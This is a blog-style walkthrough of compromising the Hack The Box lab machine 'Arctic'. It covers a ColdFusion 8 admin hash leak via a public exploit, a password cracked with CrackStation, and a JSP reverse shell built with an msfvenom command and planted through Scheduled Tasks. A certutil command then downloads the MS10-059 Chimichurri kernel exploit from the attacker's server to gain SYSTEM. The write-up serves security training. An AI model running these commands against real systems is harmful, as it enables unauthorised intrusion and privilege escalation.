---
title:     "Hack The Box - Arctic"
tags: [windows,easy,ms10-059]
---

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/1.png)

We are going to pwn Arctic from Hack The Box.

Link : <https://www.hackthebox.eu/home/machines/profile/9>


Lets Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista (91%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (90%), Microsoft Windows 7 (90%), Microsoft Windows 7 Professional or Windows 8 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

Nmap scan doesn't show whats in port ``8500`` so I started checking that, Which reveals a directory.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/2.png)

``/cfdocs/``<br/>
Some docs files, nothing useful.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/3.png)

``/CFIDE/``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/4.png)

Found an ``administrator`` over there and it leads to an login page. Which is ``ColdFusion8`` by Adobe.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/5.png)

Since we know the version we can start looking for exploits and I found this.

>https://www.exploit-db.com/exploits/14641

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/6.png)

I tried that payload in the url and it gave me a hash, It will be the admin's hash.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/7.png)

I used [CrackStation](https://crackstation.net/) to do this.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/8.png)

Logged in as admin `` happyday`` 
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/10.png)

Now its time to get reverse shell, Under ``Debugging & Logging`` Category I found ``Scheduled Tasks``.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/11.png)


![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/12.png)
It gives us an ability to download an file and store it in the box - ``Publish`` but we need to give the directory.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/13.png)

Since ColdFusion running as ``Java`` we need to create a reverse shell using ``jsp``.

> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.31 LPORT=1234 -f raw > shell.jsp

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/14.png)

We need to upload it so, I started Python HTTP server.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/15.png)
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/16.png)

Now where to store the script? I found the location of ``ColdFusion`` in ``Server Settings > Mappings``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/17.png)

Now its time to upload the shell!!
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/18.png)

Once uploaded I visited ``http://10.10.10.11:8500/CFIDE/`` is where the ``reverse shell`` is stored.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/19.png)

Started my listener and opened ``shell.jsp`` <br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/20.png)

Got User Shell and Flag!

## Privilege Escalation:

Like always when I get a shell I start with ``systeminfo`` <br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/21.png)

Where Hotfix(s): N/A which means the system is not updated so far.

>A hotfix or quick-fix engineering update is a single, cumulative package that includes information that is used to address a problem in a software product.

So we can try with [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

I Copied the ``systeminfo`` output to my machine as ``systeminfo.txt`` and start WIndows_Exploit_Suggester.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/22.png)
Since there is a lot of vulnerability, I started with ``MS10-059``.Searched for exploits and found this [Windows_kernel_exploit](https://github.com/egre55/windows-kernel-exploits)
This is the one we need.
> https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri

Uploaded the executable to the box 

> certutil.exe -urlcache -split -f http://10.10.14.31:8000/Chimichurri.exe Chimichurri.exe

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/23.png)

Started my Listener and got AUTHORITY

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-arctic/24.png)











